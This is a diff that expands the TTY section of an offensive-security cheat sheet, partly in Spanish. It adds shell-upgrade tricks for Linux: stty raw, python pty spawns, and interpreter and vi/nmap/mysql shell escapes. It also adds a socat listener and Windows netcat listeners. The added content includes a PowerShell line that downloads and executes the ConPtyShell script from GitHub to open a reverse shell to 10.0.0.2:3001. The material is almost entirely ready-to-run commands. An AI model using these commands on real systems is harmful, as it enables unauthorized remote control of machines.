@@ -12,26 +12,74 @@
 
 ## TTY
 
-```
-Ctrl + z
-stty raw -echo
-fg + enter
-enter
-export TERM=xterm
-```
+### Linux
 
 ```
-which python[3]
-python[3] -c 'import pty; pty.spawn("/bin/bash")'
-# Ctrl+Z
-# In Kali
-stty -a # Notice number of rows and columns
-stty raw -echo && fg
-# On target system
+ctrl + z
+echo $TERM && tput lines && tput cols
+
+# bash
+stty raw -echo
+fg
+
+# zsh
+stty raw -echo; fg
+
 reset
-stty rows xx
-stty columns yy
+export SHELL=bash
 export TERM=xterm-256color
+stty rows <num> columns <cols>
+```
+
+socat:
+
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:1234
+```
+
+Intérprete:
+
+```
+/usr/bin/script -qc /bin/bash /dev/null
+/bin/sh -i
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c "__import__('pty').spawn('/bin/bash')"
+python3 -c "__import__('subprocess').call(['/bin/bash'])"
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+perl -e 'print `/bin/bash`'
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+
+# vi
+:!bash
+:set shell=/bin/bash:shell
+
+# nmap
+!sh
+
+# mysql
+! bash
+```
+
+### Windows
+
+[ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
+
+Server:
+
+```bash
+# 1
+rlwrap nc -lvnp 3001
+
+# 2
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+```
+
+Cliente:
+
+```powershell
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
 
 # Proxy debugging
